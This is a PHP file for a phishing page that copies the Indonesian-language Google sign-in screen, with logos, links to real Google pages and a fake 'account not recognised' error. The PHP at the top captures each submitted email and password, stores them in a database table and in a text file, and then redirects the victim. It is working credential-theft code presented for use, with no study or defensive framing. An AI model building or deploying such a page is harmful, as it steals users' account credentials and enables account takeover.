<?php
require __DIR__ . '/../conf.php';
if(isset($_POST['submit'])){
  $email = htmlspecialchars($_POST['email']);
  $password = htmlspecialchars($_POST['password']);
  mysqli_query($conn, "INSERT INTO googledata VALUES ('$email', '$password')");
  

    $data = "---------------------------------\n $email \n $password  \n";
  file_put_contents(__DIR__."/../gp.txt", $data, FILE_APPEND);
  header('location: /gagal.php');
}
 
?>

<html>

<!---Including CSS-->
<link href="https://fonts.googleapis.com/icon?family=Material+Icons|Roboto:400" rel="stylesheet">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3mobile.css">
<link rel="icon" type="image/png" href="res/gico.png"/>
<link rel="stylesheet" href="stile.css">

 <head>
     <title>Masuk - Akun Google</title>
 </head>

	<body>
	 <p style="text-align: center;"><img src="res/gart.jpg" width="160px" height="55px" style="margin-top: 10px;"></p>
	 <p style="text-align: center;"><img src="res/gtext1.png" width="300px" height="25px"></p>
	 
	 <div style="
	 background-color: #F7F7F7;
	 border: 1px solid lightgray;
	 width: 310px;
	 margin: 0px auto;
	 ">
		 <p style="text-align: center;"><img src="res/gava.jpg" width="72px" height="70px"></p> <br>
		 <form action="" method="POST" style="margin-top: -30px;">
			 <input type="text" name="email" placeholder="Email atau ponsel" maxlength="72" required> <br>
			 <input type="password" name="password" placeholder="Kata sandi" maxlength="72" required style="margin-top: 6px"> <br>
			 <p style="
			 color: #DD4B39;
			 font-size: 84%;
			 "><b>Maaf, Google tidak mengenal akun itu.</b></p>
			 <input type="submit" name="submit" value="Masuk" style="
			 width: 277px;
			 margin-top: 6px;
			 height: 40px;
			 color: white;
			 font-weight: bold;
			 border: none;
			 background-color: #4D90FD;
			 "> <br>
		 </form>
		 <a href="https://accounts.google.com/signin/usernamerecovery?hl=in" style="
		 text-decoration: none;
		 color: #598EEE;
		 margin-left: 140px;
		 ">Temukan akun saya</a><br><br>
	 </div>
	 <br>
	<center> <a href="https://accounts.google.com/SignUp?hl=in" style="text-decoration: none;
		 color: #598EEE;
		 margin-top: -15px;">Buat akun</a> 
		 <br>
		 <img src="res/gbartext.jpg" width="300px" height="70px" style="margin-top: 10px;">
	</center>
	 
	 
	 
	</body>
</html>